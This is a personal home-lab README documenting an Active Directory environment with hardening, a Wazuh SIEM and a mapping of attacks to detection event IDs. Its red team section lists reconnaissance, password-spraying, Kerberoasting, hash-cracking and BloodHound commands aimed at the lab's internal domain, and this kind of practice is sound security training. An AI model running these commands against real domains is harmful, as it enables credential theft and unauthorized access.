# 🏴 EvilCorp Lab — Active Directory & Security Home Lab

> Personal home lab simulating an enterprise Active Directory environment for hands-on practice in system administration, hardening, red team techniques and blue team detection.

---

## 📋 Overview

This lab replicates a small enterprise network built entirely on a single physical machine using VirtualBox. The goal is to practice real-world AD administration, apply security hardening, simulate attacks and detect them through log analysis and a SIEM.

**Status:** 🟢 Active — continuously updated

---

## 🖥️ Lab Architecture

| Machine | OS | Role | IP |
|---|---|---|---|
| DC01 | Windows Server 2022 | Primary Domain Controller | 10.10.10.10 |
| DC02 | Windows Server 2022 | Secondary Domain Controller | 10.10.10.11 |
| WKSTN01 | Windows 10 | Domain Workstation (victim) | 10.10.10.20 |
| KALI | Kali Linux | Attacker machine | 10.10.10.50 |
| SIEM | Ubuntu + Wazuh | Log collection & alerting | 10.10.10.100 |
| VULN | Metasploitable | Vulnerable target machine | 10.10.10.200 |

**Hypervisor:** VirtualBox — internal network `10.10.10.0/24`  
**Domain:** `evilcorp.local`

---

## ⚙️ Infrastructure & Services

### Active Directory
- Two Domain Controllers in replication via `repadmin`
- FSMO roles configured and documented
- NTP hierarchy (DC01 as time source)
- OU structure with department-based segmentation

### Network Services
- **DNS** — integrated with AD DS
- **DHCP** — configured with Hot Standby failover between DC01 and DC02
- **DFS Namespace** — shared folders with per-department NTFS permissions
- **File Server** — differentiated access rights by user group

### Group Policy (GPO)
- Drive mapping per department via GPO
- USB device blocking policy
- Password policy and account lockout enforcement
- Software restriction policies

---

## 🔒 Hardening

Applied the following hardening measures on domain controllers and workstations:

- SMBv1 disabled via GPO and registry
- Credential Guard enabled
- Exploit Guard: DEP, CFG, ASLR
- 5 Attack Surface Reduction (ASR) rules configured
- **Tier Model** implemented (Tier 0 / Tier 1 / Tier 2 admin separation)
- Sysmon deployed with [SwiftOnSecurity](https://github.com/SwiftOnSecurity/sysmon-config) config
- Audit Policy tuned for critical event categories
- GPO blocking USB storage devices

---

## 🔴 Red Team — Attack Simulations

Attacks performed from Kali Linux against the `evilcorp.local` domain:

### Reconnaissance
```bash
# Network discovery
nmap -sV -sC -p- 10.10.10.0/24

# Domain user enumeration
kerbrute userenum --dc 10.10.10.10 -d evilcorp.local wordlist.txt
```

### Credential Attacks
```bash
# Password spraying
crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123!' --continue-on-success

# Kerberoasting — extract service tickets
impacket-GetUserSPNs evilcorp.local/user:password -dc-ip 10.10.10.10 -request

# Crack hashes offline
hashcat -m 13100 hashes.txt rockyou.txt
```

### Domain Enumeration
```bash
# BloodHound data collection
bloodhound-python -u user -p password -d evilcorp.local -dc 10.10.10.10 -c all
```
> BloodHound graph used to identify attack paths toward Domain Admin.

---

## 🔵 Blue Team — Detection & Response

### Wazuh SIEM
- Wazuh agent deployed on DC01, DC02 and WKSTN01
- Logs forwarded to Ubuntu-based Wazuh manager (10.10.10.100)
- Custom rules created for:
  - Kerberoasting detection (Event ID 4769 — RC4 encryption requests)
  - Failed logon spikes (Event ID 4625)
  - Account lockout events (Event ID 4740)
  - Kerberos pre-auth failures (Event ID 4771)

### Key Windows Event IDs Monitored

| Event ID | Description | Attack Detected |
|---|---|---|
| 4769 | Kerberos Service Ticket requested | Kerberoasting |
| 4771 | Kerberos pre-authentication failed | Brute force / spraying |
| 4625 | Account failed to log on | Password spraying |
| 4740 | User account locked out | Brute force |
| 4648 | Logon with explicit credentials | Pass-the-hash / lateral movement |
| 7045 | New service installed | Persistence techniques |

### Detection Workflow
1. Attack executed from Kali
2. Events generated on Windows machines
3. Wazuh agent forwards logs to SIEM
4. Custom alert fires on Wazuh dashboard
5. Manual triage and documentation of findings

---

## 🛠️ Tools Used

| Category | Tools |
|---|---|
| Hypervisor | VirtualBox |
| AD Administration | RSAT, PowerShell AD Module |
| Scripting | PowerShell, Bash |
| Reconnaissance | nmap, kerbrute |
| Exploitation | impacket, crackmapexec, Metasploit (base) |
| Post-exploitation | BloodHound, hashcat |
| SIEM | Wazuh (Ubuntu) |
| Monitoring | Sysmon, Windows Event Viewer |

---

## 📁 Repository Structure

```
evilcorp-lab/
├── README.md
├── infrastructure/
│   ├── network-diagram.png
│   ├── dc-setup.md
│   └── dhcp-failover.md
├── hardening/
│   ├── gpo-list.md
│   ├── asr-rules.md
│   └── sysmon-config.xml
├── red-team/
│   ├── reconnaissance.md
│   ├── kerberoasting.md
│   └── password-spraying.md
├── blue-team/
│   ├── wazuh-rules.md
│   ├── event-ids.md
│   └── detection-notes.md
└── screenshots/
    └── (lab screenshots)
```

---

## 🎯 Skills Demonstrated

- Active Directory design and administration
- Enterprise service configuration (DNS, DHCP, DFS, File Server)
- Windows Server hardening (Sysmon, ASR, Credential Guard, Tier Model)
- Red team techniques: enumeration, Kerberoasting, password spraying
- Blue team: SIEM deployment (Wazuh), custom alert rules, log analysis
- PowerShell scripting for AD management
- Network design and virtual lab management

---

## 🚧 Next Steps

- [ ] Implement LAPS (Local Administrator Password Solution)
- [ ] Add Microsoft Defender for Identity (MDI) trial
- [ ] Simulate lateral movement and document detection
- [ ] Add AZ-800 hybrid identity lab (Azure AD Connect)
- [ ] Document eJPT exam preparation notes

---

## 👤 About

**Alessandro Moreschi** — IT Support & Cybersecurity enthusiast based in Milan, Italy.  
Currently pursuing CompTIA Security+ (official exam) and building hands-on skills through this lab.

📧 moreschialessandro00@gmail.com  
🔗 [LinkedIn](https://www.linkedin.com/in/alessandro-moreschi-3233a0337/)

---

*This lab is for educational purposes only. All attacks are performed in an isolated virtual environment.*
